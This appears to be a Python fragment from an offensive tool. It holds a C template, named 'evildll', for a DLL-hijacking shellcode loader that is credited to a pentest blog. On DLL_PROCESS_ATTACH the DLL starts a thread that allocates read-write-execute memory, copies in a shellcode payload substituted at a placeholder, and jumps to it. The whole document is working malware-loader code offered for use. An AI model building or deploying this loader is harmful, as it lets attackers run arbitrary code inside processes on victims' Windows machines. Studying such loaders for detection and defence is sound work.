# Most of this code comes from https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html
evildll = """#include <windows.h>
#pragma comment (lib, "user32.lib")

unsigned char payload[] = "{{payload}}";

unsigned int payload_len = sizeof(payload);

// https://docs.microsoft.com/en-us/windows/win32/procthread/creating-threads
//int meme() {
DWORD WINAPI meme(LPVOID lpParameter) {
    LPVOID mem; // memory buffer for payload
    HANDLE pHandle; // process handle
    HANDLE th;
    SIZE_T bytesWritten;
    DWORD id;
    // Get current proc handle
    pHandle = GetCurrentProcess();

    // Allocate memory and set the rwx flags
    mem = VirtualAllocEx(pHandle, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    if (mem == NULL) {
        return -1;
    }

    // Copy the shellcode into alloc'd memory
    WriteProcessMemory(pHandle, mem, (LPCVOID)&payload, payload_len, &bytesWritten);

    // if everything went well, we should now be able to execute the shellcode
    ((void(*)())mem)();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    HANDLE th;
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
        // Create a thread and run our function 
        th = CreateThread(NULL, 0,(LPTHREAD_START_ROUTINE) meme, NULL, 0, NULL);
        // Close the thread handle
        CloseHandle(th);
        //meme(); // call it like this if you want it to run in main thread.
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
"""